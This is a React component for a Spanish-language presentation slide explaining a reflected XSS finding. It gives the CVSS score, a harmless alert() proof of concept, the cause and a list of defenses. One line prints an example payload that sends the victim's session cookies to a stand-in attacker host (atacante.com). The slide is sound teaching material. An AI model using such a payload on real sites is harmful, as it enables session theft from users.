export default function XSSDesc() {
  return (
    <div className="slide slide--two-col">
      <div className="col-accent">
        <span className="eyebrow eyebrow--light">08 — VULNERABILIDAD</span>
        <h2 className="slide-title slide-title--light slide-title--sm">XSS Reflected</h2>
        <div className="divider divider--light" />
        <div className="cvss-display" style={{background:"rgba(192,0,26,0.2)",border:"1px solid rgba(192,0,26,0.4)"}}>
          <span className="cvss-score" style={{color:"#ffb347",fontSize:"48px"}}>6.1</span>
          <div className="cvss-info">
            <span className="cvss-level" style={{color:"#ffb347"}}>MEDIO</span>
            <span className="cvss-vector" style={{color:"rgba(255,255,255,0.4)"}}>AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</span>
          </div>
        </div>
      </div>
      <div className="col-main">
        <div className="vuln-block">
          <span className="vuln-block__label">PAYLOAD UTILIZADO</span>
          <code className="code-pill">{"<script>alert('Johnen')</script>"}</code>
        </div>
        <div className="vuln-block">
          <span className="vuln-block__label">¿POR QUÉ OCURRE?</span>
          <p className="vuln-block__text">La aplicación inserta el input directamente en el HTML de la respuesta sin escapar caracteres especiales. El navegador lo interpreta como código JavaScript válido y lo ejecuta. En un escenario real un atacante podría robar cookies de sesión:</p>
          <code className="code-pill" style={{marginTop:"10px",fontSize:"10px"}}>{"?name=<script>document.location='https://atacante.com/steal?c='+document.cookie</script>"}</code>
        </div>
        <div className="vuln-block">
          <span className="vuln-block__label">DEFENSA</span>
          <p className="vuln-block__text">Output encoding · Content Security Policy · HttpOnly en cookies · Validación de inputs · Frameworks con escapado automático</p>
        </div>
      </div>
    </div>
  );
}